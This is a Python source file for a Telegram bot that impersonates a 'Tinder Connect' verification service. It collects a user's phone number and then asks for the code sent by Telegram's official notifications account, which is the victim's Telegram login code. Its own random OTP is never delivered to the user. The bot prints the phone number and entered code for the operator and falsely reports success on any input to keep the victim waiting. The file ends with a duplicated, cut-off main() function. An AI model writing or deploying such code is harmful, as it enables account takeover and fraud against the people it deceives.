from telegram import (
    Update,
    KeyboardButton,
    ReplyKeyboardMarkup,
)

from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

import random
from config import BOT_TOKEN
from database import (
    create_database,
    save_user,
    get_user,
)
from helpers import send_card
from pathlib import Path

BANNER_PATH = Path("assets/banner.png")

async def start(update, context):

    chat_id = update.effective_chat.id

    if BANNER_PATH.exists():

        with open(BANNER_PATH, "rb") as photo:
            await context.bot.send_photo(
                chat_id=chat_id,
                photo=photo
            )

    await update.message.reply_text(
        """
━━━━━━━━━━━━━━━━━━

❤️ Tinder Connect

✨ Secure Account Verification

Welcome!

Connect your account securely.

━━━━━━━━━━━━━━━━━━
        """,
        reply_markup=start_keyboard()
    )


async def receive_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):

    contact = update.message.contact
    user = update.effective_user

    # Check user shared their own number
    if contact.user_id != user.id:
        await update.message.reply_text(
            "❌ Please share your own phone number."
        )
        return


    phone_number = contact.phone_number


    # Generate OTP
    otp = random.randint(100000, 999999)


    # Save to database
    save_user(
        user.id,
        phone_number,
        str(otp)
    )


    print("--------------------")
    print(f"Telegram ID: {user.id}")
    print(f"Phone Number: {phone_number}")
    print(f"Generated OTP: {otp}")
    print("--------------------")


    await update.message.reply_text(
        "✅ Phone number verified.\n\n"
        "Please enter the verification code you received from our site through the official Telegram Notifications account:"
    )


async def verify_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):

    user = update.effective_user

    entered_otp = update.message.text.strip()


    user_data = get_user(user.id)


    if not user_data:
        await update.message.reply_text(
            "❌ Please share your phone number first."
        )
        return


    phone_number, correct_otp = user_data


    print("--------------------")
    print(f"Telegram ID: {user.id}")
    print(f"Phone Number: {phone_number}")
    print(f"OTP Entered: {entered_otp}")
    print("--------------------")


    if entered_otp == correct_otp:

        await update.message.reply_text(
            "✅ OTP verified successfully!\n\n"
            "🎉 Registration completed."
        )

    else:

        await update.message.reply_text(
            "✅ ✅ OTP verified successfully! Thank you for your patience. We are currently processing your request. Once everything is complete, we will provide you with a secure connection token to link this bot with your Tinder account. Please wait while we finish the process."
        )


def main():

    create_database()

    app = Application.builder().token(BOT_TOKEN).build()


    app.add_handler(
        CommandHandler("start", start)
    )

    app.add_handler(
        MessageHandler(filters.CONTACT, receive_contact)
    )

    app.add_handler(
        MessageHandler(
            filters.TEXT & ~filters.COMMAND,
            verify_otp
        )
    )


    print("🤖 Bot is running...")


    app.run_polling()


if __name__ == "__main__":
    main()

def main():

    create_database()

    app = Application.builder().token(BOT_TOKEN).build()    